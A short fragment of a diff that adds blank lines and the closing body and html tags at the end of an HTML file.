+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
